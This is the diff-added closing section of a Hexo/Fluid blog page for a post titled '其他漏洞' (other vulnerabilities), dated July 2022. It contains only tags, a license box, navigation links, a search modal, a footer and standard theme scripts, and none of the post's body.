+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web%E6%B8%97%E9%80%8F/">#web渗透</a>
+      
+        <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/">#中间件</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>其他漏洞</div>
+      <div>https://c47sh4rk.github.io/2022/07/26/其他漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>C47Sh4rk</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年7月26日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/07/27/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" title="业务逻辑漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">业务逻辑漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/07/26/Golang%E5%85%A5%E9%97%A8/" title="Golang入门">
+                        <span class="hidden-mobile">Golang入门</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
